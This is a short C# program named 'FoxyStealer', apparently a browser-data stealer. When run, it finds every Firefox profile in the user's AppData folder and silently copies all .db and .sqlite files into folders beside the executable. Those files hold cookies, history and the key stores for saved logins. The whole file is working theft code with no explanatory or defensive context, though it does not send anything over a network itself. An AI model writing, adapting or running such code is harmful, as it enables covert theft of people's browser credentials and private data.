using System;
using System.IO;
using System.Windows.Forms;

namespace FoxyStealer
{
    class Program
    {
        static void Main()
        {
            try
            {
                var currentLocation = Path.GetDirectoryName(Application.ExecutablePath);
                var firefoxDbFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla");
                firefoxDbFolder = Path.Combine(firefoxDbFolder, "Firefox");
                firefoxDbFolder = Path.Combine(firefoxDbFolder, "Profiles");

                foreach (var s in Directory.GetDirectories(firefoxDbFolder))
                {
                    var profileNuevo = Path.Combine(currentLocation, Path.GetFileName(s));
                    Directory.CreateDirectory(profileNuevo);

                    //*.db
                    foreach (var dbFile in Directory.GetFiles(s, "*.db"))
                        File.Copy(dbFile, Path.Combine(profileNuevo, Path.GetFileName(dbFile)), true);

                    //*.sqlite
                    foreach (var dbFile in Directory.GetFiles(s, "*.sqlite"))
                        File.Copy(dbFile, Path.Combine(profileNuevo, Path.GetFileName(dbFile)), true);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
    }
}